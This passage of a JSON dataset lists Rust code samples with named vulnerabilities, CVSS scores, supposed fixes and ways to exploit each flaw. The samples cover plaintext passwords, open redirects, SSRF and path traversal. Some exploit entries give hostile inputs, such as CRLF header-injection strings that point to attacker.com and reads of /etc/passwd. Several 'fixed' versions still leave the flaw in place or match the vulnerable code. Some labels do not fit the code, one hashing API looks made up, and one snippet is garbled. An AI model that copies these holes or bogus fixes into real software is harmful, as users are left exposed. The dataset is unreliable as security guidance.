            "Potential for rainbow table attacks if attackers use precomputed tables of hashes for the simple algorithm."
        ]
    },
    "rust_24": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "use std::collections::HashMap;\n\nstruct UserAuth {\n    users: HashMap<String, String>,\n}\n\nimpl UserAuth {\n    fn new() -> Self {\n        let mut auth = UserAuth { users: HashMap::new() };\n        auth.users.insert(\"admin\".to_string(), \"securepassword123\".to_string());\n        auth\n    }\n\n    fn login(&self, username: &str, password: &str) -> bool {\n        self.users.get(username).map_or(false, |pwd| pwd == password)\n    }\n}\n\nfn main() {\n    let auth = UserAuth::new();\n    let user_input_username = \"admin\";\n    let user_input_password = std::env::var(\"PASSWORD\").unwrap_or_default();\n    if auth.login(user_input_username, &user_input_password) {\n        println!(\"Access granted!\");\n    } else {\n        println!(\"Access denied.\");\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::collections::HashMap;\nextern crate argon2_crate;\n\nstruct UserAuth {\n    users: HashMap<String, String>,\n}\n\nimpl UserAuth {\n    fn new() -> Self {\n        let mut auth = UserAuth { users: HashMap::new() };\n        let hashed_password = argon2_crate::argon2i_simple_hash(\"securepassword123\", \"salt\").unwrap();\n        auth.users.insert(\"admin\".to_string(), hashed_password);\n        auth\n    }\n\n    fn login(&self, username: &str, password: &str) -> bool {\n        if let Some(hashed_password) = self.users.get(username) {\n            return argon2_crate::argon2i_verify(password, hashed_password).unwrap_or(false);\n        }\n        false\n    }\n}\n\nfn main() {\n    let auth = UserAuth::new();\n    let user_input_username = \"admin\";\n    let user_input_password = std::env::var(\"PASSWORD\").unwrap_or_default();\n    if auth.login(user_input_username, &user_input_password) {\n        println!(\"Access granted!\");\n    } else {\n        println!(\"Access denied.\");\n    }\n}",
        "exploit_ways": [
            "An attacker could brute force the password since it is stored in plain text.",
            "If 'PASSWORD' environment variable is predictable or reused, an attacker could gain access.",
            "A social engineering attack to obtain the password through phishing can lead to unauthorized access."
        ]
    },
    "rust_25": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index() -> HttpResponse {\n    HttpResponse::Ok().body(\"Hello world!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/\", web::get().to(index))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "cvss_score": 3.5,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index() -> HttpResponse {\n    HttpResponse::Ok()\n        .insert_header((\"Content-Security-Policy\", \"default-src 'self'\"))\n        .insert_header((\"X-Content-Type-Options\", \"nosniff\"))\n        .insert_header((\"X-Frame-Options\", \"SAMEORIGIN\"))\n        .insert_header((\"X-XSS-Protection\", \"1; mode=block\"))\n        .body(\"Hello world!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/\", web::get().to(index))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "exploit_ways": [
            "Attackers can inject malicious scripts into the response body if user input is not sanitized, leading to XSS.",
            "Without Content Security Policy (CSP), an attacker could load unauthorized resources or execute code in the context of the web application.",
            "X-Frame-Options header missing allows clickjacking attacks by embedding the site in an iframe."
        ]
    },
    "rust_26": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "use std::env;\nuse std::process;\n\nfn main() {\n    let args: Vec<String> = env::args().collect();\n    if args.len() > 1 {\n        let url = &args[1];\n        println!(\"Redirecting to: {}\");\n        process::Command::new(\"xdg-open\").arg(url).spawn().unwrap();\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use std::env;\nuse std::process;\n\nfn main() {\n    let args: Vec<String> = env::args().collect();\n    if args.len() > 1 {\n        let url = &args[1];\n        if is_safe_url(url) {\n            println!(\"Redirecting to: {}\");\n            process::Command::new(\"xdg-open\").arg(url).spawn().unwrap();\n        } else {\n            println!(\"Unsafe URL detected\");\n        }\n    }\n}\n\nfn is_safe_url(url: &str) -> bool {\n    let allowed_domains = [\"example.com\", \"safe.com\"];\n    url::Url::parse(url)\n        .map(|parsed_url| allowed_domains.contains(&parsed_url.domain().unwrap_or_default()))\n        .unwrap_or(false)\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL to redirect users to phishing sites or malware.",
            "Using a crafted URL with a protocol like 'file://' could expose local files on the user's machine.",
            "Injecting URLs that trigger downloads of harmful content directly from the command line."
        ]
    },
    "rust_27": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "use reqwest::blocking::get;\n\nstruct Fetcher {\n    url: String,\n}\n\nimpl Fetcher {\n    fn new(url: String) -> Self {\n        Fetcher { url }\n    }\n\n    fn fetch(&self) -> Result<String, reqwest::Error> {\n        let response = get(&self.url)?;\n        Ok(response.text()?)\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use reqwest::blocking::get;\n\nstruct Fetcher {\n    url: String,\n}\n\nimpl Fetcher {\n    fn new(url: String) -> Self {\n        if !url.starts_with(\"http://example.com/\") {\n            panic!(\"Invalid URL\");\n        }\n        Fetcher { url }\n    }\n\n    fn fetch(&self) -> Result<String, reqwest::Error> {\n        let response = get(&self.url)?;\n        Ok(response.text()?)\n    }\n}",
        "exploit_ways": [
            "An attacker can use the Fetcher to request internal resources like http://127.0.0.1/secret.",
            "They might try accessing file protocols such as file:///etc/passwd through the URL parameter.",
            "Inputting a crafted URL pointing to an external server could lead to data exfiltration."
        ]
    },
    "rust_28": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nstruct VulnerableApp;\n\nimpl VulnerableApp {\n    async fn handle_request(&self) -> HttpResponse {\n        HttpResponse::Ok().body(\"Hello, world!\")\n    }\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| App::new()\n        .route(\"/\", web::get().to(VulnerableApp.handle_request)))\n        .bind(\"127.0.0.1:8080\")?\n        .run()\n        .await\n}",
        "cvss_score": 6.5,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nstruct SecureApp;\n\nimpl SecureApp {\n    async fn handle_request(&self) -> HttpResponse {\n        HttpResponse::Ok()\n            .insert_header((\"Content-Security-Policy\", \"default-src 'self'\"))\n            .insert_header((\"X-Frame-Options\", \"DENY\"))\n            .insert_header((\"X-XSS-Protection\", \"1; mode=block\"))\n            .insert_header((\"X-Content-Type-Options\", \"nosniff\"))\n            .body(\"Hello, world!\")\n    }\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| App::new()\n        .route(\"/\", web::get().to(SecureApp.handle_request)))\n        .bind(\"127.0.0.1:8080\")?\n        .run()\n        .await\n}",
        "exploit_ways": [
            "An attacker could perform clickjacking attacks due to the lack of X-Frame-Options header.",
            "Cross-site scripting (XSS) attacks might be possible because Content Security Policy is not set.",
            "Sensitive information could be exposed by MIME type sniffing since X-Content-Type-Options is missing."
        ]
    },
    "rust_29": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "use std::sync::{Arc, Mutex};\n\nfn unsafe_function(data: Arc<Mutex<String>>) {\n    let mut value = data.lock().unwrap();\n    *value += \"Some operation\";\n    drop(value);\n}",
        "cvss_score": 4.2,
        "fixed_code": "use std::sync::{Arc, Mutex};\n\nfn safe_function(data: Arc<Mutex<String>>) {\n    let mut value = data.lock().unwrap();\n    *value += \"Some operation\";\n    // drop(value) is not necessary as the lock guard will be dropped automatically when it goes out of scope\n}",
        "exploit_ways": [
            "An attacker could cause a race condition by rapidly calling the function, leading to inconsistent data states.",
            "If combined with other vulnerabilities, this race condition might allow unauthorized access or data corruption.",
            "In certain scenarios, it can lead to deadlocks if not properly managed in complex applications."
        ]
    },
    "rust_30": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "use actix_web::cookie::{Cookie, SameSite};\nuse actix_web::web;\nuse actix_web::HttpResponse;\n\nasync fn set_session_cookie(user_id: String) -> HttpResponse {\n    let cookie = Cookie::build(\"user_id\", user_id)\n        .path(\"\")\n        .same_site(SameSite::Strict)\n        .secure(true)\n        .http_only(true)\n        .finish();\n\n    HttpResponse::Ok()\n        .cookie(cookie)\n        .body(\"\")\n}",
        "cvss_score": 4.2,
        "fixed_code": "use actix_web::cookie::{Cookie, SameSite};\nuse actix_web::web;\nuse actix_web::HttpResponse;\nuse rand::Rng;\n\nasync fn set_session_cookie(user_id: String) -> HttpResponse {\n    let session_id: String = rand::thread_rng().sample_iter(&rand::distributions::Alphanumeric).take(30).map(char::from).collect();\n    let cookie = Cookie::build(\"session_id\", session_id)\n        .path(\"\")\n        .same_site(SameSite::Strict)\n        .secure(true)\n        .http_only(true)\n        .finish();\n\n    HttpResponse::Ok()\n        .cookie(cookie)\n        .body(\"\")\n}",
        "exploit_ways": [
            "An attacker could set a session cookie before the user logs in to hijack their session.",
            "If the attacker knows the fixed session ID, they can use it to impersonate the user without logging in.",
            "The vulnerability allows attackers to maintain control over sessions if users log in from compromised machines."
        ]
    },
    "rust_31": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "use std::fs;\nuse std::io;\n\nfn read_file(path: &str) -> io::Result<String> {\n    fs::read_to_string(path)\n}",
        "cvss_score": 5.3,
        "fixed_code": "use std::fs;\nuse std::io;\n\nfn read_file(base_dir: &str, file_name: &str) -> io::Result<String> {\n    let path = format!(\"{}/{}\", base_dir, file_name);\n    fs::read_to_string(path)\n}",
        "exploit_ways": [
            "An attacker can input a malicious path like \"/etc/passwd\" to read sensitive system files.",
            "Using \"../\" sequences in the path could navigate up the directory tree to access unintended files.",
            "Crafting a path with special characters or encoded sequences might bypass simple validation checks."
        ]
    },
    "rust_32": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#[derive(Serialize)]\nstruct User {\n    name: String,\n    email: String,\n}\n\nfn main() {\n    let user = User {\n        name: String::from(\"Alice\"),\n        email: String::from(\"alice@example.com\"),\n    };\n    println!(\"User details: {{\\\"name\\\": \\\"{}\\\", \\\"email\\\": \\\"{}\\\"}}\", user.name, user.email);\n}",
        "cvss_score": 2.3,
        "fixed_code": "#[derive(Serialize)]\nstruct User {\n    name: String,\n    email: String,\n}\n\nfn main() {\n    let user = User {\n        name: String::from(\"Alice\"),\n        email: String::from(\"alice@example.com\"),\n    };\n    println!(\"User details: {{\\\"name\\\": \\\"{}\\\", \\\"email\\\": \\\"{}\\\"}}\", user.name, user.email);\n}\n\n// No actual clickjacking vulnerability in this code snippet; it's a simple struct and print statement.\n// Ensure your web applications set X-Frame-Options or Content-Security-Policy headers to prevent clickjacking.",
        "exploit_ways": [
            "If this struct were used in a web application without proper headers, an attacker could embed the site in an iframe to trick users into clicking unintended elements.",
            "An attacker could overlay malicious buttons over legitimate ones on a compromised website to hijack user interactions.",
            "Without X-Frame-Options or CSP frame-ancestors directive, a phishing attack could use this page within a crafted webpage to deceive users."
        ]
    },
    "rust_33": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "fn set_session_id(user_id: &str) -> String {\n    format!(\"session_{}\", user_id)\n}",
        "cvss_score": 3.5,
        "fixed_code": "use rand::Rng;\n\nfn set_session_id(user_id: &str) -> String {\n    let mut rng = rand::thread_rng();\n    let random_suffix: u64 = rng.gen();\n    format!(\"session_{}_{}\", user_id, random_suffix)\n}",
        "exploit_ways": [
            "An attacker could predict or guess the session ID by using a known user ID.",
            "By setting a specific session ID in cookies before logging in, an attacker can hijack the session if the server does not regenerate the session ID upon login.",
            "If the user ID is predictable (e.g., sequential numbers), an attacker can attempt to fixate sessions for multiple users."
        ]
    },
    "rust_34": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "use reqwest::blocking::get;\n\nstruct Fetcher {\n    url: String,\n}\n\nimpl Fetcher {\n    fn new(url: &str) -> Fetcher {\n        Fetcher { url: url.to_string() }\n    }\n\n    fn fetch(&self) -> Result<String, reqwest::Error> {\n        let response = get(&self.url)?;\n        response.text()\n    }\n}\n\nfn main() -> Result<(), Box<dyn std::error::Error>> {\n    let user_input = \"http://example.com\"; // Simulate user input\n    let fetcher = Fetcher::new(user_input);\n    println!(\"Fetched content: {}\", fetcher.fetch()?.trim());\n    Ok(())\n}",
        "cvss_score": 7.5,
        "fixed_code": "use reqwest::blocking::get;\n\nstruct Fetcher {\n    url: String,\n}\n\nimpl Fetcher {\n    fn new(url: &str) -> Fetcher {\n        let allowed_host = \"example.com\";\n        if !url.starts_with(&format!(\"http://{}/\", allowed_host)) && !url.starts_with(&format!(\"https://{}/\", allowed_host)) {\n            panic!(\"URL is not allowed\");\n        }\n        Fetcher { url: url.to_string() }\n    }\n\n    fn fetch(&self) -> Result<String, reqwest::Error> {\n        let response = get(&self.url)?;\n        response.text()\n    }\n}\n\nfn main() -> Result<(), Box<dyn std::error::Error>> {\n    let user_input = \"http://example.com\"; // Simulate user input\n    let fetcher = Fetcher::new(user_input);\n    println!(\"Fetched content: {}\", fetcher.fetch()?.trim());\n    Ok(())\n}",
        "exploit_ways": [
            "An attacker could use an internal IP address like 'http://127.0.0.1' to access internal services.",
            "Exploiting the vulnerability with a local file URL such as 'file:///etc/passwd' can lead to information disclosure.",
            "Crafting a request to 'http://malicious.com' could be used to exfiltrate data or perform other malicious actions."
        ]
    },
    "rust_35": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "pub struct Button {\n    pub label: String,\n    pub onclick: fn(),\n}\n\nimpl Button {\n    pub fn new(label: &str, onclick: fn()) -> Self {\n        Button {\n            label: label.to_string(),\n            onclick,\n        }\n    }\n\n    pub fn render(&self) {\n        println!(\"<button onclick=\\\"{}\\\">{}</button>\", self.onclick as *const (), self.label);\n    }\n}",
        "cvss_score": 3.0,
        "fixed_code": "pub struct Button {\n    pub label: String,\n}\n\nimpl Button {\n    pub fn new(label: &str) -> Self {\n        Button {\n            label: label.to_string(),\n        }\n    }\n\n    pub fn render(&self, onclick: &str) {\n        println!(\"<button onclick=\\\"{}\\\">{}</button>\", onclick, self.label);\n    }\n}",
        "exploit_ways": [
            "An attacker could inject malicious onclick handlers to perform unintended actions.",
            "Using the vulnerable render method, an attacker can redirect users to phishing sites when they click on buttons.",
            "Attackers can embed hidden buttons that execute harmful scripts without user knowledge."
        ]
    },
    "rust_37": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "use std::io::{self, Write};\n\nfn main() {\n    println!(\"Enter your name:\");\n    io::stdout().flush().unwrap();\n    let mut input = String::new();\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\n    println!(\"Hello, {}!\", input);\n}",
        "cvss_score": 5.3,
        "fixed_code": "use std::io::{self, Write};\n\nfn main() {\n    println!(\"Enter your name:\");\n    io::stdout().flush().unwrap();\n    let mut input = String::new();\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\n    let clean_input = input.trim().replace(|c: char| !c.is_alphanumeric(), \"\");\n    println!(\"Hello, {}!\", clean_input);\n}",
        "exploit_ways": [
            "An attacker could input a name with '\\r\\nSet-Cookie: session=malicious' to inject malicious cookies.",
            "They can use '\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nContent-Length: 53\\r\\n\\r\\n<html><h1>XSS Attack</h1></html>' to inject a new response.",
            "Injecting '\\r\\nLocation: http://attacker.com' could redirect the user to an attacker-controlled site."
        ]
    },
    "rust_38": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use warp::Filter;\n\n#[tokio::main]\nasync fn main() {\n    let routes = warp::path(\"hello\").map(|| \"Hello, World!\");\n    warp::serve(routes)\n        .run(([127, 0, 0, 1], 3030))\n        .await;\n}",
        "cvss_score": 6.5,
        "fixed_code": "use warp::Filter;\n\n#[tokio::main]\nasync fn main() {\n    let routes = warp::path(\"hello\").map(|| \"Hello, World!\");\n    let cors = warp::cors()\n        .allow_any_origin()\n        .allow_methods(vec![\"GET\", \"POST\"])\n        .allow_headers(vec![\"content-type\"]);\n\n    let with_security_headers = warp::filters::header::optional::<String>(\"x-custom-header\").and(routes)\n        .map(|_: Option<String>, response| {\n            (\n                warp::http::Response::builder()\n                    .header(\"Content-Security-Policy\", \"default-src 'self'\")\n                    .header(\"X-Frame-Options\", \"DENY\")\n                    .header(\"X-XSS-Protection\", \"1; mode=block\")\n                    .header(\"X-Content-Type-Options\", \"nosniff\")\n                    .header(\"Referrer-Policy\", \"strict-origin-when-cross-origin\")\n                    .body(response),\n            )\n        });\n\n    warp::serve(cors.and(with_security_headers))\n        .run(([127, 0, 0, 1], 3030))\n        .await;\n}",
        "exploit_ways": [
            "An attacker could perform a clickjacking attack because X-Frame-Options is not set.",
            "A Cross-Site Scripting (XSS) attack might be possible due to missing Content Security Policy headers.",
            "Attackers can sniff sensitive data over non-HTTPS connections as there's no HSTS header enforcing HTTPS."
        ]
    },
    "rust_39": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index(_req: web::HttpRequest) -> HttpResponse {\n    HttpResponse::Ok().body(\"Hello world!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| App::new().route(\"/\", web::get().to(index)))\n        .bind(\"127.0.0.1:8080\")?\n        .run()\n        .await\n}",
        "cvss_score": 4.3,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index(_req: web::HttpRequest) -> HttpResponse {\n    HttpResponse::Ok()\n        .header(\"Content-Security-Policy\", \"default-src 'self'\")\n        .header(\"X-Content-Type-Options\", \"nosniff\")\n        .header(\"X-XSS-Protection\", \"1; mode=block\")\n        .header(\"Strict-Transport-Security\", \"max-age=31536000\")\n        .body(\"Hello world!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| App::new().route(\"/\", web::get().to(index)))\n        .bind(\"127.0.0.1:8080\")?\n        .run()\n        .await\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the response if there's any user input reflected back, leading to Cross-Site Scripting (XSS).",
            "Without Content Security Policy headers, an attacker might be able to load insecure resources from external domains.",
            "Absence of X-Content-Type-Options and X-XSS-Protection headers leaves the application vulnerable to MIME type sniffing attacks and older browsers' XSS protections bypass."
        ]
    },
    "rust_40": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "use std::fs;\n\nfn read_file(path: &str) -> Result<String, std::io::Error> {\n    let content = fs::read_to_string(path)?;\n    Ok(content)\n}\n\nfn main() {\n    let path = \"secret.txt\";\n    match read_file(path) {\n        Ok(content) => println!(\"File content: {}\", content),\n        Err(e) => eprintln!(\"Error reading file: {}\", e),\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "use std::fs;\n\nfn read_file(path: &str) -> Result<String, std::io::Error> {\n    if path != \"secret.txt\" {\n        return Err(std::io::Error::new(std::io::ErrorKind::Other, \"Access denied\"));\n    }\n    let content = fs::read_to_string(path)?;\n    Ok(content)\n}\n\nfn main() {\n    let path = \"secret.txt\";\n    match read_file(path) {\n        Ok(content) => println!(\"File content: {}\", content),\n        Err(e) => eprintln!(\"Error reading file: {}\", e),\n    }\n}",
        "exploit_ways": [
            "An attacker could specify a different path to access other sensitive files on the system.",
            "By exploiting this vulnerability, they might be able to read configuration files containing credentials.",
            "If the application logs errors, an attacker could use crafted inputs to cause error messages that disclose information about the file structure."
        ]
    },
    "rust_41": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "fn race_condition() {\n    let mut shared_data = 0;\n    let handle1 = std::thread::spawn(move || {\n        for _ in 0..1000 {\n            shared_data += 1;\n        }\n    });\n    let handle2 = std::thread::spawn(move || {\n        for _ in 0..1000 {\n            shared_data -= 1;\n        }\n    });\n    handle1.join().unwrap();\n    handle2.join().unwrap();\n}",
        "cvss_score": 5.3,
        "fixed_code": "use std::sync::{Arc, Mutex};\n\nfn race_condition() {\n    let shared_data = Arc::new(Mutex::new(0));\n    let handle1 = {\n        let shared_data = shared_data.clone();\n        std::thread::spawn(move || {\n            for _ in 0..1000 {\n                *shared_data.lock().unwrap() += 1;\n            }\n        })\n    };\n    let handle2 = {\n        let shared_data = shared_data.clone();\n        std::thread::spawn(move || {\n            for _ in 0..1000 {\n                *shared_data.lock().unwrap() -= 1;\n            }\n        })\n    };\n    handle1.join().unwrap();\n    handle2.join().unwrap();\n}",
        "exploit_ways": [
            "An attacker can cause the final shared_data value to be inconsistent due to unsynchronized access.",
            "In a real-world scenario, this could lead to data corruption or incorrect financial transactions if applied in that context.",
            "By carefully timing thread executions, an attacker might manipulate the outcome of operations depending on shared state."
        ]
    },
    "rust_42": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "struct FileReader {\n    file_path: String,\n}\n\nimpl FileReader {\n    fn read_file(&self) -> Result<String, std::io::Error> {\n        use std::fs;\n        fs::read_to_string(self.file_path.clone())\n    }\n}",
        "cvss_score": 4.3,
        "fixed_code": "struct FileReader {\n    base_directory: String,\n    relative_file_path: String,\n}\n\nimpl FileReader {\n    fn read_file(&self) -> Result<String, std::io::Error> {\n        use std::fs;\n        let full_path = format!(\"{}/{}\", self.base_directory, self.relative_file_path);\n        fs::read_to_string(full_path)\n    }\n}",
        "exploit_ways": [
            "An attacker could specify a file path like \"/etc/passwd\" to read sensitive system files.",
            "Could use relative paths such as \"../../secret.txt\" to navigate to files outside the intended directory.",
            "Malicious input like \"\\\\..\\\\flag.txt\" on Windows systems might bypass naive filtering."
        ]
    },
    "rust_43": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "use actix_web::\\{web, App, HttpResponse, HttpServer\\};\n\nasync fn redirect_handler(query: web::Query<HashMap<String, String>>) -> HttpResponse {\n    if let Some(url) = query.get(\"url\") {\n        HttpResponse::Found().header(\"Location\", url).finish()\n    } else {\n        HttpResponse::BadRequest().body(\"\")\n    }\n}\n\n\\[actix_web::main\\]\nasync fn main() -> std::io::Result<\\()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/redirect\", web::get().to(redirect_handler))\n    })\n    .bind(\"127.0.0.1:8080\")?\\n    .run()\\n    .await\n}",
        "cvss_score": 6.5,
        "fixed_code": "use actix_web::\\{web, App, HttpResponse, HttpServer\\};\nuse url::Url;\n\nfn is_valid_redirect(url: &str) -> bool {\n    let parsed_url = Url::parse(url);\n    matches!(parsed_url, Ok(u) if u.scheme() == \"http\" || u.scheme() == \"https\") && !url.contains(\"malicious.com\")\n}\n\nasync fn redirect_handler(query: web::Query<HashMap<String, String>>) -> HttpResponse {\n    if let Some(url) = query.get(\"url\") {\n        if is_valid_redirect(url) {\n            HttpResponse::Found().header(\"Location\", url).finish()\n        } else {\n            HttpResponse::BadRequest().body(\"\")\n        }\n    } else {\n        HttpResponse::BadRequest().body(\"\")\n    }\n}\n\n\\[actix_web::main\\]\nasync fn main() -> std::io::Result<\\()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/redirect\", web::get().to(redirect_handler))\n    })\n    .bind(\"127.0.0.1:8080\")?\\n    .run()\\n    .await\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious website by providing a URL parameter like '?url=http://malicious.com'.",
            "By using the vulnerability, an attacker could redirect authenticated users to a phishing site that mimics the legitimate login page.",
            "The open redirection flaw allows attackers to craft URLs that can lead users to download malware from compromised sites."
        ]
    },
    "rust_44": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "use std::net::TcpListener;\nuse std::io::{Read, Write};\n\nfn handle_client(mut stream: std::net::TcpStream) {\n    let mut buffer = [0; 512];\n    stream.read(&mut buffer).unwrap();\n    let request = String::from_utf8_lossy(&buffer);\n    if let Some(redir) = request.split_whitespace().nth(1) {\n        if redir.contains(\"redirect=\") {\n            let url = &redir[9..];\n            let response = format!(\"HTTP/1.1 302 Found\\r\\nLocation: {}\\r\\n\\r\\n\", url);\n            stream.write(response.as_bytes()).unwrap();\n        }\n    }\n}\n\nfn main() {\n    let listener = TcpListener::bind(\"127.0.0.1:7878\").unwrap();\n    for stream in listener.incoming() {\n        handle_client(stream.unwrap());\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use std::net::TcpListener;\nuse std::io::{Read, Write};\n\nfn is_safe_url(url: &str) -> bool {\n    url.starts_with(\"http://localhost\") || url.starts_with(\"https://example.com\")\n}\n\nfn handle_client(mut stream: std::net::TcpStream) {\n    let mut buffer = [0; 512];\n    stream.read(&mut buffer).unwrap();\n    let request = String::from_utf8_lossy(&buffer);\n    if let Some(redir) = request.split_whitespace().nth(1) {\n        if redir.contains(\"redirect=\") {\n            let url = &redir[9..];\n            if is_safe_url(url) {\n                let response = format!(\"HTTP/1.1 302 Found\\r\\nLocation: {}\\r\\n\\r\\n\", url);\n                stream.write(response.as_bytes()).unwrap();\n            } else {\n                let response = \"HTTP/1.1 400 Bad Request\\r\\n\\r\\nInvalid redirect URL\";\n                stream.write(response.as_bytes()).unwrap();\n            }\n        }\n    }\n}\n\nfn main() {\n    let listener = TcpListener::bind(\"127.0.0.1:7878\").unwrap();\n    for stream in listener.incoming() {\n        handle_client(stream.unwrap());\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing an external URL.",
            "Could exploit the open redirect to bypass login screens or access restricted pages on legitimate sites.",
            "Redirect to phishing websites to steal user credentials."
        ]
    },
    "rust_45": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn index() -> HttpResponse {\n    HttpResponse::Ok().body(\"Hello World!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/\", web::get().to(index))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "cvss_score": 4.0,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\nuse actix_web::http::header;\n\nasync fn index() -> HttpResponse {\n    HttpResponse::Ok()\n        .insert_header((header::CONTENT_SECURITY_POLICY, \"default-src 'self'\"))\n        .insert_header((header::X_FRAME_OPTIONS, header::HeaderValue::from_static(\"DENY\")))\n        .insert_header((header::X_CONTENT_TYPE_OPTIONS, header::HeaderValue::from_static(\"nosniff\")))\n        .insert_header((header::X_XSS_PROTECTION, header::HeaderValue::from_static(\"1; mode=block\")))\n        .body(\"Hello World!\")\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/\", web::get().to(index))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the response to perform XSS attacks.",
            "Lack of Content Security Policy (CSP) allows loading resources from insecure origins.",
            "Absence of X-Frame-Options header makes the application vulnerable to clickjacking."
        ]
    },
    "rust_46": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "fn main() {\n    let mut buffer = String::new();\n    std::io::stdin().read_line(&mut buffer).expect(\"Failed to read line\");\n    if buffer.trim() == \"stop\" {\n        loop {}\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "fn main() {\n    let mut buffer = String::new();\n    std::io::stdin().read_line(&mut buffer).expect(\"Failed to read line\");\n    if buffer.trim() == \"stop\" {\n        println!(\"Stopping...\");\n        return;\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'stop' to cause the program to enter an infinite loop, freezing it.",
            "By repeatedly entering 'stop', they could exhaust system resources if multiple instances are run.",
            "If integrated into a larger service, this could disrupt user interactions by making parts of the application unresponsive."
        ]
    },
    "rust_47": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "use std::net::TcpListener;\n\nfn main() {\n    let listener = TcpListener::bind(\"127.0.0.1:7878\").unwrap();\n    for stream in listener.incoming() {\n        let _stream = stream.unwrap();\n        // Handle connection here without setting security headers\n    }\n}",
        "cvss_score": 5.4,
        "fixed_code": "use std::net::TcpListener;\nuse hyper::{Body, Request, Response, Server};\nuse hyper::service::{make_service_fn, service_fn};\nuse futures::future;\n\nasync fn handle_request(_req: Request<Body>) -> Result<Response<Body>, hyper::Error> {\n    let mut response = Response::new(Body::from(\"Hello, world!\"));\n    *response.headers_mut() = [\n        (hyper::header::CONTENT_TYPE, \"text/plain; charset=utf-8\".parse().unwrap()),\n        (\"X-Content-Type-Options\", \"nosniff\".parse().unwrap()),\n        (\"X-XSS-Protection\", \"1; mode=block\".parse().unwrap()),\n        (\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\".parse().unwrap())\n    ].iter().cloned().collect();\n    Ok(response)\n}\n\n#[tokio::main]\nasync fn main() {\n    let addr = ([127, 0, 0, 1], 7878).into();\n    let make_svc = make_service_fn(|_conn| {\n        async { Ok::<_, hyper::Error>(service_fn(handle_request)) }\n    });\n\n    let server = Server::bind(&addr).serve(make_svc);\n\n    if let Err(e) = server.await {\n        eprintln!(\"server error: {}\", e);\n    }\n}",
        "exploit_ways": [
            "An attacker could perform Clickjacking attacks as X-Frame-Options is missing.",
            "The lack of Content Security Policy (CSP) allows for XSS attacks.",
            "Without proper security headers, the server might be vulnerable to MIME-sniffing attacks."
        ]
    },
    "rust_48": {
        "vulnerability_type": "Open Redirect",
